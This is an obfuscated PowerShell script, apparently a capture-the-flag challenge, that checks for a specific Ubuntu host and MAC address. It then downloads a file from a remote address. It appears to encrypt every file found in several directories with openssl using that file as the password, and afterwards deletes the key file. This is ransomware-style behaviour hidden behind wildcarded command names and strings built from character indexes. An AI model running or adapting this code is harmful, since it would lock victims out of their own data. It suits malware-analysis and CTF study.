function main 
{
    setup
    gen_alphabet
    A50
    A44
    A41
    exit
}

function setup 
{
    if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]){exit}
    if (-not ((&(Get-Command /???/?at) /etc/*release*) | grep noble)){exit}
    if ((&(Get-Command /???/?at) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit} # intentional guard in chal to prevent accidentally running the script
}

function gen_alphabet
{
    $gen_str = (&(Get-Command /???/?at) /etc/*release*).split('\n')
    $A45 = ($gen_str[0] += $gen_str[1].split('=')[0] += $gen_str[2] += $gen_str[3].split('=')[0] += $gen_str[4].split('=')[0] += $gen_str[5] += $gen_str[6].split('=')[0] += $gen_str[7].split('=')[0] += $gen_str[8] += $gen_str[9] += $gen_str[10] += $gen_str[11] += $gen_str[12] += $gen_str[13] += $gen_str[14] += $gen_str[15] += $gen_str[16]).Tochararray() + 0..9
    $A45 = (-join ($A45 | sort-object | get-unique))
    $Global:A48 = $A45
}

function A50 
{
    $A40 = $GLOBAL:A48[3] + $GLOBAL:A48[5] + $GLOBAL:A48[12] + $GLOBAL:A48[8] + $GLOBAL:A48[7] + $GLOBAL:A48[12] + $GLOBAL:A48[1] + $GLOBAL:A48[6] + $GLOBAL:A48[5] + $GLOBAL:A48[12] + $GLOBAL:A48[6] + $GLOBAL:A48[5] + $GLOBAL:A48[14] + $GLOBAL:A48[3] + $GLOBAL:A48[1] + $GLOBAL:A48[3] + $GLOBAL:A48[3] + $GLOBAL:A48[7] + $GLOBAL:A48[13] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56]
    $A45A = $GLOBAL:A48[16]
    &(Get-Command /???/?ge?) $A40 -q -O $A45A
}

function A44
{
    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[52] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    } 

    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[43] + $GLOBAL:A48[48] + $GLOBAL:A48[46] + $GLOBAL:A48[41] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    } 

    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[41] + $GLOBAL:A48[52] + $GLOBAL:A48[39] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f' )))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    } 

    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[54] + $GLOBAL:A48[37] + $GLOBAL:A48[50] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    }
}

function A41
{
    &(Get-Command R?m???-I???) $GLOBAL:A48[16]
}


main
